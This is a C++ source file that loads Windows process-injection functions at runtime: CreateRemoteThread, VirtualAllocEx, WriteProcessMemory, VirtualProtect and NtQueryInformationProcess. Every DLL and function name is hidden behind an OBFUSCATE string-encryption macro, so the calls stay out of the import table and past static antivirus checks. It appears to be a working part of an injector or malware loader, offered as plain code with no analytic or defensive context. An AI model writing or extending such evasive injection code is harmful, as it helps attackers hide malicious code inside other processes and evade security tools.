#include "api_loader.h"
#include "string_obfuscation.h"

namespace DynamicAPI {

    // Global function pointers (initialized to NULL)
    pCreateRemoteThread fnCreateRemoteThread = nullptr;
    pVirtualAllocEx fnVirtualAllocEx = nullptr;
    pWriteProcessMemory fnWriteProcessMemory = nullptr;
    pVirtualProtect fnVirtualProtect = nullptr;
    pCreateToolhelp32Snapshot fnCreateToolhelp32Snapshot = nullptr;
    pModule32FirstW fnModule32FirstW = nullptr;
    pModule32NextW fnModule32NextW = nullptr;
    pNtQueryInformationProcess fnNtQueryInformationProcess = nullptr;

    bool InitializeAPIs() {
        // Get module handles with obfuscated names
        char kernel32Name[32];
        OBFUSCATE("kernel32.dll").decrypt(kernel32Name, sizeof(kernel32Name));
        HMODULE hKernel32 = GetModuleHandleA(kernel32Name);
        if (!hKernel32) return false;

        char ntdllName[32];
        OBFUSCATE("ntdll.dll").decrypt(ntdllName, sizeof(ntdllName));
        HMODULE hNtdll = GetModuleHandleA(ntdllName);
        if (!hNtdll) return false;

        // Load CreateRemoteThread
        char apiName1[32];
        OBFUSCATE("CreateRemoteThread").decrypt(apiName1, sizeof(apiName1));
        fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, apiName1);

        // Load VirtualAllocEx
        char apiName2[32];
        OBFUSCATE("VirtualAllocEx").decrypt(apiName2, sizeof(apiName2));
        fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, apiName2);

        // Load WriteProcessMemory
        char apiName3[32];
        OBFUSCATE("WriteProcessMemory").decrypt(apiName3, sizeof(apiName3));
        fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, apiName3);

        // Load VirtualProtect
        char apiName4[32];
        OBFUSCATE("VirtualProtect").decrypt(apiName4, sizeof(apiName4));
        fnVirtualProtect = (pVirtualProtect)GetProcAddress(hKernel32, apiName4);

        // Load CreateToolhelp32Snapshot
        char apiName5[32];
        OBFUSCATE("CreateToolhelp32Snapshot").decrypt(apiName5, sizeof(apiName5));
        fnCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProcAddress(hKernel32, apiName5);

        // Load Module32FirstW
        char apiName6[32];
        OBFUSCATE("Module32FirstW").decrypt(apiName6, sizeof(apiName6));
        fnModule32FirstW = (pModule32FirstW)GetProcAddress(hKernel32, apiName6);

        // Load Module32NextW
        char apiName7[32];
        OBFUSCATE("Module32NextW").decrypt(apiName7, sizeof(apiName7));
        fnModule32NextW = (pModule32NextW)GetProcAddress(hKernel32, apiName7);

        // Load NtQueryInformationProcess
        char apiName8[32];
        OBFUSCATE("NtQueryInformationProcess").decrypt(apiName8, sizeof(apiName8));
        fnNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, apiName8);

        // Verify all critical APIs loaded
        return (fnCreateRemoteThread != nullptr &&
                fnVirtualAllocEx != nullptr &&
                fnWriteProcessMemory != nullptr &&
                fnVirtualProtect != nullptr &&
                fnNtQueryInformationProcess != nullptr);
    }

    bool AreAPIsLoaded() {
        return (fnCreateRemoteThread != nullptr &&
                fnVirtualAllocEx != nullptr &&
                fnWriteProcessMemory != nullptr);
    }
}
